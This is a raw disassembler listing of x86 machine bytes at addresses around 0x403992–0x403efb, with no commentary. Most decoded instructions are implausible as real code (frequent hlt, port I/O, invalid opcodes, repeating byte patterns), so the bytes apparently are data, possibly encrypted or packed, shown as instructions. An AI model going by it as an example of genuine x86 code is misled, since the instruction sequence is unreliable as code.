  403992:	7f 6a                	jg     0x4039fe
  403994:	67 d3 7a 60          	sarl   %cl,0x60(%bp,%si)
  403998:	e3 31                	jecxz  0x4039cb
  40399a:	32 69 df             	xor    -0x21(%ecx),%ch
  40399d:	36 3c 4f             	ss cmp $0x4f,%al
  4039a0:	b8 6b 8d 33 8a       	mov    $0x8a338d6b,%eax
  4039a5:	6b 95 a4 69 21 de ed 	imul   $0xffffffed,-0x21de965c(%ebp),%edx
  4039ac:	2d 68 35 d1 28       	sub    $0x28d13568,%eax
  4039b1:	6c                   	insb   (%dx),%es:(%edi)
  4039b2:	b1 33                	mov    $0x33,%cl
  4039b4:	60                   	pusha
  4039b5:	6b 8d 34 60 4d ea 67 	imul   $0x67,-0x15b29fcc(%ebp),%ecx
  4039bc:	2d 80 b1 23 8c       	sub    $0x8c23b180,%eax
  4039c1:	8f                   	(bad)
  4039c2:	3c e7                	cmp    $0xe7,%al
  4039c4:	9b                   	fwait
  4039c5:	1d 37 66 68 3b       	sbb    $0x3b686637,%eax
  4039ca:	64 3d a1 a7 5a f6    	fs cmp $0xf65aa7a1,%eax
  4039d0:	f8                   	clc
  4039d1:	f4                   	hlt
  4039d2:	aa                   	stos   %al,%es:(%edi)
  4039d3:	f6 d0                	not    %al
  4039d5:	64 2a 26             	sub    %fs:(%esi),%ah
  4039d8:	68 f4 81 9e 16       	push   $0x169e81f4
  4039dd:	24 3a                	and    $0x3a,%al
  4039df:	f6 d1                	not    %cl
  4039e1:	dc 3c 79             	fdivrl (%ecx,%edi,2)
  4039e4:	2b f4                	sub    %esp,%esi
  4039e6:	bf a6 f8 f4 aa       	mov    $0xaaf4f8a6,%edi
  4039eb:	f6 1c 4a             	negb   (%edx,%ecx,2)
  4039ee:	aa                   	stos   %al,%es:(%edi)
  4039ef:	f6 f8                	idiv   %al
  4039f1:	f4                   	hlt
  4039f2:	0b 6e f8             	or     -0x8(%esi),%ebp
  4039f5:	f4                   	hlt
  4039f6:	aa                   	stos   %al,%es:(%edi)
  4039f7:	f6 28                	imulb  (%eax)
  4039f9:	f4                   	hlt
  4039fa:	aa                   	stos   %al,%es:(%edi)
  4039fb:	f6 f8                	idiv   %al
  4039fd:	f4                   	hlt
  4039fe:	7a f6                	jp     0x4039f6
  403a00:	f8                   	clc
  403a01:	f4                   	hlt
  403a02:	aa                   	stos   %al,%es:(%edi)
  403a03:	f6 28                	imulb  (%eax)
  403a05:	f4                   	hlt
  403a06:	aa                   	stos   %al,%es:(%edi)
  403a07:	f6 f8                	idiv   %al
  403a09:	f4                   	hlt
  403a0a:	7a f6                	jp     0x403a02
  403a0c:	f8                   	clc
  403a0d:	f4                   	hlt
  403a0e:	aa                   	stos   %al,%es:(%edi)
  403a0f:	f6 51 bc             	notb   -0x44(%ecx)
  403a12:	aa                   	stos   %al,%es:(%edi)
  403a13:	f6 f8                	idiv   %al
  403a15:	f4                   	hlt
  403a16:	4f                   	dec    %edi
  403a17:	bc f8 f4 aa f6       	mov    $0xf6aaf4f8,%esp
  403a1c:	d0 64 9a 24          	shlb   $1,0x24(%edx,%ebx,4)
  403a20:	68 f4 81 16 a5       	push   $0xa51681f4
  403a25:	26 3a f6             	es cmp %dh,%dh
  403a28:	d1 e2                	shl    $1,%edx
  403a2a:	7f 81                	jg     0x4039ad
  403a2c:	02 f4                	add    %ah,%dh
  403a2e:	bf a6 f8 f4 aa       	mov    $0xaaf4f8a6,%edi
  403a33:	f6 1c 78             	negb   (%eax,%edi,2)
  403a36:	aa                   	stos   %al,%es:(%edi)
  403a37:	f6 f8                	idiv   %al
  403a39:	f4                   	hlt
  403a3a:	0b 6e f8             	or     -0x8(%esi),%ebp
  403a3d:	f4                   	hlt
  403a3e:	aa                   	stos   %al,%es:(%edi)
  403a3f:	f6 eb                	imul   %bl
  403a41:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a42:	3e f6 f8             	ds idiv %al
  403a45:	f4                   	hlt
  403a46:	03 be f8 f4 aa f6    	add    -0x9550b08(%esi),%edi
  403a4c:	1d 88 aa f6 f8       	sbb    $0xf8f6aa88,%eax
  403a51:	f4                   	hlt
  403a52:	5b                   	pop    %ebx
  403a53:	f6 f8                	idiv   %al
  403a55:	f4                   	hlt
  403a56:	aa                   	stos   %al,%es:(%edi)
  403a57:	f6 0f 8d             	testb  $0x8d,(%edi)
  403a5a:	b3 57                	mov    $0x57,%bl
  403a5c:	95                   	xchg   %eax,%ebp
  403a5d:	9b                   	fwait
  403a5e:	f9                   	stc
  403a5f:	06                   	push   %es
  403a60:	f8                   	clc
  403a61:	f4                   	hlt
  403a62:	aa                   	stos   %al,%es:(%edi)
  403a63:	f6 f8                	idiv   %al
  403a65:	03 d2                	add    %edx,%edx
  403a67:	66 68 64 3a          	pushw  $0x3a64
  403a6b:	3e f8                	ds clc
  403a6d:	f4                   	hlt
  403a6e:	aa                   	stos   %al,%es:(%edi)
  403a6f:	f6 f8                	idiv   %al
  403a71:	61                   	popa
  403a72:	ff 5c 28 64          	lcall  *0x64(%eax,%ebp,1)
  403a76:	aa                   	stos   %al,%es:(%edi)
  403a77:	4b                   	dec    %ebx
  403a78:	03 5e 7a             	add    0x7a(%esi),%ebx
  403a7b:	66 f8                	data16 clc
  403a7d:	ef                   	out    %eax,(%dx)
  403a7e:	22 f6                	and    %dh,%dh
  403a80:	f8                   	clc
  403a81:	f4                   	hlt
  403a82:	aa                   	stos   %al,%es:(%edi)
  403a83:	ed                   	in     (%dx),%eax
  403a84:	20 60 aa             	and    %ah,-0x56(%eax)
  403a87:	f6 f8                	idiv   %al
  403a89:	ef                   	out    %eax,(%dx)
  403a8a:	6a 6e                	push   $0x6e
  403a8c:	f8                   	clc
  403a8d:	f4                   	hlt
  403a8e:	aa                   	stos   %al,%es:(%edi)
  403a8f:	57                   	push   %edi
  403a90:	7b f4                	jnp    0x403a86
  403a92:	aa                   	stos   %al,%es:(%edi)
  403a93:	f6 f8                	idiv   %al
  403a95:	e7 f9                	out    %eax,$0xf9
  403a97:	62                   	(bad)
  403a98:	f8                   	clc
  403a99:	f4                   	hlt
  403a9a:	aa                   	stos   %al,%es:(%edi)
  403a9b:	5f                   	pop    %edi
  403a9c:	a3 f4 aa f6 f8       	mov    %eax,0xf8f6aaf4
  403aa1:	18 d6                	sbb    %dl,%dh
  403aa3:	f6 f8                	idiv   %al
  403aa5:	f4                   	hlt
  403aa6:	aa                   	stos   %al,%es:(%edi)
  403aa7:	e5 a8                	in     $0xa8,%eax
  403aa9:	68 aa f6 f8 e7       	push   $0xe7f8f6aa
  403aae:	02 66 f8             	add    -0x8(%esi),%ah
  403ab1:	f4                   	hlt
  403ab2:	aa                   	stos   %al,%es:(%edi)
  403ab3:	13 a0 f4 aa f6 f8    	adc    -0x709550c(%eax),%esp
  403ab9:	05 aa f6 f8 f4       	add    $0xf4f8f6aa,%eax
  403abe:	aa                   	stos   %al,%es:(%edi)
  403abf:	01 81 d7 0b 9b 97    	add    %eax,-0x6864f429(%ecx)
  403ac5:	64 2a 26             	sub    %fs:(%esi),%ah
  403ac8:	68 9c 44 26 68       	push   $0x6826449c
  403acd:	dc 3c 79             	fdivrl (%ecx,%edi,2)
  403ad0:	2b 64 9a 24          	sub    0x24(%edx,%ebx,4),%esp
  403ad4:	68 14 f7 24 68       	push   $0x6824f714
  403ad9:	e2 7f                	loop   0x403b5a
  403adb:	81 02 a7 5a f6 f8    	addl   $0xf8f65aa7,(%edx)
  403ae1:	f4                   	hlt
  403ae2:	aa                   	stos   %al,%es:(%edi)
  403ae3:	f6 d0                	not    %al
  403ae5:	64 2a 26             	sub    %fs:(%esi),%ah
  403ae8:	68 f4 50 62 f8       	push   $0xf86250f4
  403aed:	f4                   	hlt
  403aee:	aa                   	stos   %al,%es:(%edi)
  403aef:	f6 37                	divb   (%edi)
  403af1:	f4                   	hlt
  403af2:	aa                   	stos   %al,%es:(%edi)
  403af3:	f6 f8                	idiv   %al
  403af5:	f4                   	hlt
  403af6:	b9 9e 68 f4 aa       	mov    $0xaaf4689e,%ecx
  403afb:	f6 1c 36             	negb   (%esi,%esi,1)
  403afe:	aa                   	stos   %al,%es:(%edi)
  403aff:	f6 f8                	idiv   %al
  403b01:	f4                   	hlt
  403b02:	81 9e 16 24 3a f6 e1 	sbbl   $0xf6aabde1,-0x9c5dbea(%esi)
  403b09:	bd aa f6 
  403b0c:	f8                   	clc
  403b0d:	f4                   	hlt
  403b0e:	13 a7 f8 f4 aa f6    	adc    -0x9550b08(%edi),%esp
  403b14:	59                   	pop    %ecx
  403b15:	b6 aa                	mov    $0xaa,%dh
  403b17:	f6 f8                	idiv   %al
  403b19:	f4                   	hlt
  403b1a:	6a f6                	push   $0xfffffff6
  403b1c:	f8                   	clc
  403b1d:	f4                   	hlt
  403b1e:	aa                   	stos   %al,%es:(%edi)
  403b1f:	f6 e1                	mul    %cl
  403b21:	ac                   	lods   %ds:(%esi),%al
  403b22:	aa                   	stos   %al,%es:(%edi)
  403b23:	f6 f8                	idiv   %al
  403b25:	f4                   	hlt
  403b26:	cd 91                	int    $0x91
  403b28:	f8                   	clc
  403b29:	f4                   	hlt
  403b2a:	aa                   	stos   %al,%es:(%edi)
  403b2b:	f6 f9                	idiv   %cl
  403b2d:	f4                   	hlt
  403b2e:	aa                   	stos   %al,%es:(%edi)
  403b2f:	f6 f8                	idiv   %al
  403b31:	f4                   	hlt
  403b32:	62 f6 f8             	(bad) {rz-bad},{%k4}{z}
  403b35:	f4                   	hlt
  403b36:	aa                   	stos   %al,%es:(%edi)
  403b37:	f6 d6                	not    %dh
  403b39:	dc 3c 79             	fdivrl (%ecx,%edi,2)
  403b3c:	2b f4                	sub    %esp,%esi
  403b3e:	0b 56 f8             	or     -0x8(%esi),%edx
  403b41:	f4                   	hlt
  403b42:	aa                   	stos   %al,%es:(%edi)
  403b43:	f6 69 9c             	imulb  -0x64(%ecx)
  403b46:	aa                   	stos   %al,%es:(%edi)
  403b47:	f6 f8                	idiv   %al
  403b49:	f4                   	hlt
  403b4a:	d8 94 f8 f4 aa f6 d0 	fcoms  -0x2f09550c(%eax,%edi,8)
  403b51:	64 9a 24 68 f4 b9 9e 	fs lcall $0x689e,$0xb9f46824
  403b58:	68 
  403b59:	f4                   	hlt
  403b5a:	aa                   	stos   %al,%es:(%edi)
  403b5b:	f6 1c 36             	negb   (%esi,%esi,1)
  403b5e:	aa                   	stos   %al,%es:(%edi)
  403b5f:	f6 f8                	idiv   %al
  403b61:	f4                   	hlt
  403b62:	81 16 a5 26 3a f6    	adcl   $0xf63a26a5,(%esi)
  403b68:	e1 bd                	loope  0x403b27
  403b6a:	aa                   	stos   %al,%es:(%edi)
  403b6b:	f6 f8                	idiv   %al
  403b6d:	f4                   	hlt
  403b6e:	13 a7 f8 f4 aa f6    	adc    -0x9550b08(%edi),%esp
  403b74:	59                   	pop    %ecx
  403b75:	b6 aa                	mov    $0xaa,%dh
  403b77:	f6 f8                	idiv   %al
  403b79:	f4                   	hlt
  403b7a:	6a f6                	push   $0xfffffff6
  403b7c:	f8                   	clc
  403b7d:	f4                   	hlt
  403b7e:	aa                   	stos   %al,%es:(%edi)
  403b7f:	f6 e1                	mul    %cl
  403b81:	ac                   	lods   %ds:(%esi),%al
  403b82:	aa                   	stos   %al,%es:(%edi)
  403b83:	f6 f8                	idiv   %al
  403b85:	f4                   	hlt
  403b86:	cd 91                	int    $0x91
  403b88:	f8                   	clc
  403b89:	f4                   	hlt
  403b8a:	aa                   	stos   %al,%es:(%edi)
  403b8b:	f6 f9                	idiv   %cl
  403b8d:	f4                   	hlt
  403b8e:	aa                   	stos   %al,%es:(%edi)
  403b8f:	f6 f8                	idiv   %al
  403b91:	f4                   	hlt
  403b92:	62 f6 f8             	(bad) {rz-bad},{%k4}{z}
  403b95:	f4                   	hlt
  403b96:	aa                   	stos   %al,%es:(%edi)
  403b97:	f6 d6                	not    %dh
  403b99:	e2 7f                	loop   0x403c1a
  403b9b:	81 02 f4 0b 56 f8    	addl   $0xf8560bf4,(%edx)
  403ba1:	f4                   	hlt
  403ba2:	aa                   	stos   %al,%es:(%edi)
  403ba3:	f6 69 9c             	imulb  -0x64(%ecx)
  403ba6:	aa                   	stos   %al,%es:(%edi)
  403ba7:	f6 f8                	idiv   %al
  403ba9:	f4                   	hlt
  403baa:	d8 94 f8 f4 aa f6 09 	fcoms  0x9f6aaf4(%eax,%edi,8)
  403bb1:	f4                   	hlt
  403bb2:	aa                   	stos   %al,%es:(%edi)
  403bb3:	f6 f8                	idiv   %al
  403bb5:	f4                   	hlt
  403bb6:	5d                   	pop    %ebp
  403bb7:	8f                   	(bad)
  403bb8:	53                   	push   %ebx
  403bb9:	55                   	push   %ebp
  403bba:	c7                   	(bad)
  403bbb:	99                   	cltd
  403bbc:	ab                   	stos   %eax,%es:(%edi)
  403bbd:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403bbe:	6f                   	outsl  %ds:(%esi),(%dx)
  403bbf:	ef                   	out    %eax,(%dx)
  403bc0:	8d                   	lea    (bad),%esp
  403bc1:	e7 d6                	out    %eax,$0xd6
  403bc3:	7e 3b                	jle    0x403c00
  403bc5:	32 6d ed             	xor    -0x13(%ebp),%ch
  403bc8:	35 6c b1 23 64       	xor    $0x6423b16c,%eax
  403bcd:	02 b3 23 64 a3 7f    	add    0x7fa36423(%ebx),%dh
  403bd3:	9a b0 5d f6 30 e3 21 	lcall  $0x21e3,$0x30f65db0
  403bda:	c6                   	(bad)
  403bdb:	ef                   	out    %eax,(%dx)
  403bdc:	aa                   	stos   %al,%es:(%edi)
  403bdd:	55                   	push   %ebp
  403bde:	f8                   	clc
  403bdf:	ef                   	out    %eax,(%dx)
  403be0:	3d 98 0b 90 d0       	cmp    $0xd0900b98,%eax
  403be5:	5d                   	pop    %ebp
  403be6:	09 66 68             	or     %esp,0x68(%esi)
  403be9:	93                   	xchg   %eax,%ebx
  403bea:	5f                   	pop    %edi
  403beb:	9a e1 21 d6 ef 2d 98 	lcall  $0x982d,$0xefd621e1
  403bf2:	5c                   	pop    %esp
  403bf3:	a1 2d 94 3a 66       	mov    0x663a942d,%eax
  403bf8:	81 be 3a 66 68 e5 57 	cmpl   $0x27259a57,-0x1a9799c6(%esi)
  403bff:	9a 25 27 
  403c02:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  403c05:	bc 3b 96 38 8c       	mov    $0x8c38963b,%esp
  403c0a:	ff 91 97 9b 63 ef    	call   *-0x109c6469(%ecx)
  403c10:	aa                   	stos   %al,%es:(%edi)
  403c11:	ec                   	in     (%dx),%al
  403c12:	6f                   	outsl  %ds:(%esi),(%dx)
  403c13:	9d                   	popf
  403c14:	e8 19 c1 66 1d       	call   0x1da6fd32
  403c19:	62                   	(bad)
  403c1a:	fc                   	cld
  403c1b:	23 92 64 d1 4c 80    	and    -0x7fb32e9c(%edx),%edx
  403c21:	03 78 66             	add    0x66(%eax),%edi
  403c24:	68 ed 7f 8e d0       	push   $0xd08e7fed
  403c29:	9b                   	fwait
  403c2a:	45                   	inc    %ebp
  403c2b:	66 68 db 3d          	pushw  $0x3ddb
  403c2f:	66 68 64 35          	pushw  $0x3564
  403c33:	d0 3d 9f b3 9f 41    	sarb   $1,0x419fb39f
  403c39:	b5 a3                	mov    $0xa3,%ch
  403c3b:	91                   	xchg   %eax,%ecx
  403c3c:	91                   	xchg   %eax,%ecx
  403c3d:	ed                   	in     (%dx),%eax
  403c3e:	fb                   	sti
  403c3f:	ed                   	in     (%dx),%eax
  403c40:	2d 8c a3 91 91       	sub    $0x9191a38c,%eax
  403c45:	ed                   	in     (%dx),%eax
  403c46:	f8                   	clc
  403c47:	ee                   	out    %al,(%dx)
  403c48:	3d 9e b0 62 76       	cmp    $0x7662b09e,%eax
  403c4d:	58                   	pop    %eax
  403c4e:	4a                   	dec    %edx
  403c4f:	14 7c                	adc    $0x7c,%al
  403c51:	58                   	pop    %eax
  403c52:	45                   	inc    %ebp
  403c53:	11 78 ed             	adc    %edi,-0x13(%eax)
  403c56:	e2 67                	loop   0x403cbf
  403c58:	98                   	cwtl
  403c59:	24 35                	and    $0x35,%al
  403c5b:	d0 78 6b             	sarb   $1,0x6b(%eax)
  403c5e:	8c 2b                	mov    %gs,(%ebx)
  403c60:	92                   	xchg   %eax,%edx
  403c61:	4d                   	dec    %ebp
  403c62:	f0 ee                	lock out %al,(%dx)
  403c64:	78 6b                	js     0x403cd1
  403c66:	8c 62 76             	mov    %fs,0x76(%edx)
  403c69:	59                   	pop    %ecx
  403c6a:	d8 66 68             	fsubs  0x68(%esi)
  403c6d:	64 4f                	fs dec %edi
  403c6f:	76 e1                	jbe    0x403c52
  403c71:	bc 3b 96 28 6b       	mov    $0x6b28963b,%esp
  403c76:	8c 76 67             	mov    %?,0x67(%esi)
  403c79:	d2 77 9c             	shlb   %cl,-0x64(%edi)
  403c7c:	41                   	inc    %ecx
  403c7d:	ae                   	scas   %es:(%edi),%al
  403c7e:	b2 76                	mov    $0x76,%dl
  403c80:	02 6c 52 f6          	add    -0xa(%edx,%edx,2),%ch
  403c84:	68 64 3a eb 2d       	push   $0x2deb3a64
  403c89:	96                   	xchg   %eax,%esi
  403c8a:	6a 8e                	push   $0xffffff8e
  403c8c:	b0 25                	mov    $0x25,%al
  403c8e:	3a 66 e3             	cmp    -0x1d(%esi),%ah
  403c91:	21 c6                	and    %eax,%esi
  403c93:	ef                   	out    %eax,(%dx)
  403c94:	aa                   	stos   %al,%es:(%edi)
  403c95:	65 f8                	gs clc
  403c97:	ef                   	out    %eax,(%dx)
  403c98:	3d 98 35 d0 2d       	cmp    $0x2dd03598,%eax
  403c9d:	9f                   	lahf
  403c9e:	6a ef                	push   $0xffffffef
  403ca0:	b0 65                	mov    $0x65,%al
  403ca2:	ca 36 e5             	lret   $0xe536
  403ca5:	21 c8                	and    %ecx,%eax
  403ca7:	69 de 31 c0 67 b8    	imul   $0xb867c031,%esi,%ebx
  403cad:	34 d2                	xor    $0xd2,%al
  403caf:	cf                   	iret
  403cb0:	29 64 3a 0c          	sub    %esp,0xc(%edx,%edi,1)
  403cb4:	6e                   	outsb  %ds:(%esi),(%dx)
  403cb5:	e9 7f 94 38 ed       	jmp    0xed78d139
  403cba:	e2 67                	loop   0x403d23
  403cbc:	98                   	cwtl
  403cbd:	34 d2                	xor    $0xd2,%al
  403cbf:	ff 29                	ljmp   *(%ecx)
  403cc1:	64 3a e5             	fs cmp %ch,%ah
  403cc4:	ac                   	lods   %ds:(%esi),%al
  403cc5:	40                   	inc    %eax
  403cc6:	b9 a0 6e ef 7f       	mov    $0x7fef6ea0,%ecx
  403ccb:	9a e1 a6 0b a4 e1 31 	lcall  $0x31e1,$0xa40ba6e1
  403cd2:	c6 00 97             	movb   $0x97,(%eax)
  403cd5:	21 ca                	and    %ecx,%edx
  403cd7:	69 df 21 36 2e 51    	imul   $0x512e3621,%edi,%ebx
  403cdd:	a2 35 e4 71 9b       	mov    %al,0x9b71e435
  403ce2:	c5 99 37 3a 61 af    	lds    -0x509ec5c9(%ecx),%ebx
  403ce8:	ab                   	stos   %eax,%es:(%edi)
  403ce9:	31 b3 83 eb 88 12    	xor    %esi,0x1288eb83(%ebx)
  403cef:	35 3e 33 84 4d       	xor    $0x4d84333e,%eax
  403cf4:	32 19                	xor    (%ecx),%bl
  403cf6:	13 ef                	adc    %edi,%ebp
  403cf8:	98                   	cwtl
  403cf9:	65 ca ef ae          	gs lret $0xaeef
  403cfd:	8c b0 27 68 64 80    	mov    %?,-0x7f9b97d9(%eax)
  403d03:	6b 68 67 fa          	imul   $0xfffffffa,0x67(%eax),%ebp
  403d07:	37                   	aaa
  403d08:	e1 a5                	loope  0x403caf
  403d0a:	cd 8c                	int    $0x8c
  403d0c:	69 ae fb 9c 65 a5 c3 	imul   $0xae4179c3,-0x5a9a6305(%esi),%ebp
  403d13:	79 41 ae 
  403d16:	b3 b6                	mov    $0xb6,%bl
  403d18:	31 ed                	xor    %ebp,%ebp
  403d1a:	f8                   	clc
  403d1b:	ee                   	out    %al,(%dx)
  403d1c:	3d 8b b9 5b 38       	cmp    $0x385bb98b,%eax
  403d21:	ce                   	into
  403d22:	78 66                	js     0x403d8a
  403d24:	68 11 3d 57 a8       	push   $0xa8573d11
  403d29:	8d 0f                	lea    (%edi),%ecx
  403d2b:	64 68 64 b7 23 88    	fs push $0x8823b764
  403d31:	34 c5                	xor    $0xc5,%al
  403d33:	13 60 8c             	adc    -0x74(%eax),%esp
  403d36:	e5 9e                	in     $0x9e,%eax
  403d38:	97                   	xchg   %eax,%edi
  403d39:	9b                   	fwait
  403d3a:	b9 a2 60 ed f9       	mov    $0xf9ed60a2,%ecx
  403d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  403d40:	a8 6b                	test   $0x6b,%al
  403d42:	be 7a 6a 64 3a       	mov    $0x3a646a7a,%esi
  403d47:	69 de 19 d5 a7 8f    	imul   $0x8fa7d519,%esi,%ebx
  403d4d:	66 b1 72             	data16 mov $0x72,%cl
  403d50:	55                   	push   %ebp
  403d51:	5c                   	pop    %esp
  403d52:	90                   	nop
  403d53:	24 68                	and    $0x68,%al
  403d55:	4f                   	dec    %edi
  403d56:	2e 5b                	cs pop %ebx
  403d58:	5c                   	pop    %esp
  403d59:	ce                   	into
  403d5a:	78 66                	js     0x403dc2
  403d5c:	e1 b3                	loope  0x403d11
  403d5e:	75 ef                	jne    0x403d4f
  403d60:	15 8c 6d 69 de       	adc    $0xde696d8c,%eax
  403d65:	19 d5                	sbb    %edx,%ebp
  403d67:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403d68:	8f                   	(bad)
  403d69:	66 c5 52 55          	lds    0x55(%edx),%dx
  403d6d:	50                   	push   %eax
  403d6e:	90                   	nop
  403d6f:	24 68                	and    $0x68,%al
  403d71:	ed                   	in     (%dx),%eax
  403d72:	e5 65                	in     $0x65,%eax
  403d74:	55                   	push   %ebp
  403d75:	34 90                	xor    $0x90,%al
  403d77:	24 68                	and    $0x68,%al
  403d79:	33 d2                	xor    %edx,%edx
  403d7b:	bb 28 64 3a 0c       	mov    $0xc3a6428,%ebx
  403d80:	64 0e                	fs push %cs
  403d82:	3a ef                	cmp    %bh,%ch
  403d84:	b0 67                	mov    $0x67,%al
  403d86:	3f                   	aas
  403d87:	36 c2 26 3a          	ss ret $0x3a26
  403d8b:	65 2d 8c 6a 8e bc    	gs sub $0xbc8e6a8c,%eax
  403d91:	24 3a                	and    $0x3a,%al
  403d93:	66 eb a0             	data16 jmp 0x403d36
  403d96:	22 c7                	and    %bh,%al
  403d98:	3c ce                	cmp    $0xce,%al
  403d9a:	78 66                	js     0x403e02
  403d9c:	e1 21                	loope  0x403dbf
  403d9e:	c6                   	(bad)
  403d9f:	8d 79 ed             	lea    -0x13(%ecx),%edi
  403da2:	e2 65                	loop   0x403e09
  403da4:	2d 98 b1 73 34       	sub    $0x3473b198,%eax
  403da9:	ce                   	into
  403daa:	78 66                	js     0x403e12
  403dac:	59                   	pop    %ecx
  403dad:	74 b9                	je     0x403d68
  403daf:	23 94 60 9b 32 c2 26 	and    0x26c2329b(%eax,%eiz,2),%edx
  403db6:	3a 65 6d             	cmp    0x6d(%ebp),%ah
  403db9:	3c 90                	cmp    $0x90,%al
  403dbb:	24 68                	and    $0x68,%al
  403dbd:	5d                   	pop    %ebp
  403dbe:	7f 9a                	jg     0x403d5a
  403dc0:	1a bb 9b 06 c2 26    	sbb    0x26c2069b(%ebx),%bh
  403dc6:	3a ef                	cmp    %bh,%ch
  403dc8:	2d 9c d1 7c e1       	sub    $0xe17cd19c,%eax
  403dcd:	bc 39 23 90 ef       	mov    $0xef902339,%esp
  403dd2:	2f                   	das
  403dd3:	0e                   	push   %cs
  403dd4:	c2 26 3a             	ret    $0x3a26
  403dd7:	57                   	push   %edi
  403dd8:	78 ed                	js     0x403dc7
  403dda:	ca 91 8e             	lret   $0x8e91
  403ddd:	ed                   	in     (%dx),%eax
  403dde:	7f ba                	jg     0x403d9a
  403de0:	e1 a2                	loope  0x403d84
  403de2:	b9 23 90 60 9b       	mov    $0x9b609023,%ecx
  403de7:	06                   	push   %es
  403de8:	c2 26 3a             	ret    $0x3a26
  403deb:	65 6d                	gs insl (%dx),%es:(%edi)
  403ded:	00 90 24 68 5d 7f    	add    %dl,0x7f5d6824(%eax)
  403df3:	9e                   	sahf
  403df4:	1a b2 d2 f7 28 64    	sbb    0x6428f7d2(%edx),%dh
  403dfa:	3a ef                	cmp    %bh,%ch
  403dfc:	2d b8 d2 ef 28       	sub    $0x28efd2b8,%eax
  403e01:	64 3a ed             	fs cmp %ch,%ch
  403e04:	15 b8 35 d1 97       	adc    $0x97d135b8,%eax
  403e09:	ed                   	in     (%dx),%eax
  403e0a:	f8                   	clc
  403e0b:	69 df b6 fb 84 78    	imul   $0x7884fbb6,%edi,%ebx
  403e11:	6d                   	insl   (%dx),%es:(%edi)
  403e12:	ed                   	in     (%dx),%eax
  403e13:	ef                   	out    %eax,(%dx)
  403e14:	55                   	push   %ebp
  403e15:	38 90 24 68 ed ca    	cmp    %dl,-0x351297dc(%eax)
  403e1b:	4f                   	dec    %edi
  403e1c:	98                   	cwtl
  403e1d:	ed                   	in     (%dx),%eax
  403e1e:	fc                   	cld
  403e1f:	8e 00                	mov    (%eax),%es
  403e21:	24 3a                	and    $0x3a,%al
  403e23:	66 e1 21             	data16 loope 0x403e47
  403e26:	e2 8e                	loop   0x403db6
  403e28:	08 24 3a             	or     %ah,(%edx,%edi,1)
  403e2b:	66 e3 19             	data16 jecxz 0x403e47
  403e2e:	e2 69                	loop   0x403e99
  403e30:	df 9b b3 a4 67 d3    	fistps -0x2c985b4d(%ebx)
  403e36:	e8 a7 8a 74 33       	call   0x33b4c8e2
  403e3b:	b1 e1                	mov    $0xe1,%cl
  403e3d:	59                   	pop    %ecx
  403e3e:	52                   	push   %edx
  403e3f:	cc                   	int3
  403e40:	2a 64 50 26          	sub    0x26(%eax,%edx,2),%ah
  403e44:	00 20                	add    %ah,(%eax)
  403e46:	90                   	nop
  403e47:	24 68                	and    $0x68,%al
  403e49:	ed                   	in     (%dx),%eax
  403e4a:	e2 65                	loop   0x403eb1
  403e4c:	6d                   	insl   (%dx),%es:(%edi)
  403e4d:	28 90 24 68 34 d2    	sub    %dl,-0x2dcb97dc(%eax)
  403e53:	63 28                	arpl   %ebp,(%eax)
  403e55:	64 3a e5             	fs cmp %ch,%ah
  403e58:	ac                   	lods   %ds:(%esi),%al
  403e59:	68 9b 32 c2 26       	push   $0x26c2329b
  403e5e:	3a ef                	cmp    %bh,%ch
  403e60:	2d 90 d1 71 e1       	sub    $0xe171d190,%eax
  403e65:	94                   	xchg   %eax,%esp
  403e66:	0b 96 e1 a2 b3 be    	or     -0x414c5d1f(%esi),%edx
  403e6c:	6b 21 ce             	imul   $0xffffffce,(%ecx),%esp
  403e6f:	ed                   	in     (%dx),%eax
  403e70:	7d 38                	jge    0x403eaa
  403e72:	90                   	nop
  403e73:	24 68                	and    $0x68,%al
  403e75:	55                   	push   %ebp
  403e76:	2a e5                	sub    %ch,%ah
  403e78:	2d 90 3e c7 3c       	sub    $0x3cc73e90,%eax
  403e7d:	ce                   	into
  403e7e:	78 66                	js     0x403ee6
  403e80:	6b 61 62 cc          	imul   $0xffffffcc,0x62(%ecx),%esp
  403e84:	2a 64 03 23          	sub    0x23(%ebx,%eax,1),%ah
  403e88:	9c                   	pushf
  403e89:	16                   	push   %ss
  403e8a:	e3 c7                	jecxz  0x403e53
  403e8c:	08 ce                	or     %cl,%dh
  403e8e:	78 66                	js     0x403ef6
  403e90:	e1 21                	loope  0x403eb3
  403e92:	ca 8d 79             	lret   $0x798d
  403e95:	ed                   	in     (%dx),%eax
  403e96:	e2 65                	loop   0x403efd
  403e98:	2d 94 b1 73 00       	sub    $0x73b194,%eax
  403e9d:	ce                   	into
  403e9e:	78 66                	js     0x403f06
  403ea0:	59                   	pop    %ecx
  403ea1:	74 b9                	je     0x403e5c
  403ea3:	23 98 60 9b 06 c2    	and    -0x3df964a0(%eax),%ebx
  403ea9:	26 3a 65 6d          	cmp    %es:0x6d(%ebp),%ah
  403ead:	00 90 24 68 5d 7f    	add    %dl,0x7f5d6824(%eax)
  403eb3:	96                   	xchg   %eax,%esi
  403eb4:	1a bb b3 b9 6b 59    	sbb    0x596bb9b3(%ebx),%bh
  403eba:	6a cc                	push   $0xffffffcc
  403ebc:	2a 64 35 d0          	sub    -0x30(%ebp,%esi,1),%ah
  403ec0:	3d 8b eb 84 e3       	cmp    $0xe384eb8b,%eax
  403ec5:	70 af                	jo     0x403e76
  403ec7:	0a c2                	or     %dl,%al
  403ec9:	26 3a ed             	es cmp %ch,%ch
  403ecc:	65 38 90 24 68 ed 36 	cmp    %dl,%gs:0x36ed6824(%eax)
  403ed3:	5c                   	pop    %esp
  403ed4:	e1 bb                	loope  0x403e91
  403ed6:	39 5b 38             	cmp    %ebx,0x38(%ebx)
  403ed9:	ce                   	into
  403eda:	78 66                	js     0x403f42
  403edc:	67 d2 6f 89          	shrb   %cl,-0x77(%bx)
  403ee0:	b9 86 b1 72 fd       	mov    $0xfd72b186,%ecx
  403ee5:	14 90                	adc    $0x90,%al
  403ee7:	24 68                	and    $0x68,%al
  403ee9:	ef                   	out    %eax,(%dx)
  403eea:	37                   	aaa
  403eeb:	0e                   	push   %cs
  403eec:	c2 26 3a             	ret    $0x3a26
  403eef:	ef                   	out    %eax,(%dx)
  403ef0:	64 5e                	fs pop %esi
  403ef2:	bb a0 51 34 3a       	mov    $0x3a3451a0,%ebx
  403ef7:	66 e8 19 d5          	callw  0x1414
  403efb:	67 1d 60 b9 0b 80    	addr16 sbb $0x800bb960,%eax
